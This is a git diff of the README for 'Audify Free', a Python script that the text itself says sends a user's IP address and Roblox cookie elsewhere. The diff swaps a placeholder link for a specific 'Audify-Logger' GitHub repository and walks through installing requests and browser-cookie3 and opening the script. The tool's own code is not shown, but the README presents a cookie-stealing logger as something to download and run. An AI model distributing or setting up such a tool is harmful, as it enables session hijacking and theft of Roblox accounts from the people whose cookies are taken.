@@ -4,7 +4,7 @@ Audify Free is a Python script that sends your IP address and Roblox cookie to a
 
 ## How to use
 
-1. Download Audify Free from [GitHub](https://github.com/yourusername/audify-free) and extract the files to a folder.
+1. Download Audify Free from [GitHub](https://github.com/Mani175/Audify-Logger) and extract the files to a folder. (Press The Green code button and download)
 
 2. Open a command prompt (Windows) or terminal (Mac/Linux).
 
@@ -12,11 +12,11 @@ Audify Free is a Python script that sends your IP address and Roblox cookie to a
 
 Type the following command and press Enter to install requests:
 
-`pip install requests`
+  `pip install requests`
 
 Type the following command and press Enter to install browser_cookie3:
 
-`pip install browser-cookie3`
+  `pip install browser-cookie3`
 
 
 4. Go to the `AudifyFree.py` file on your computer.
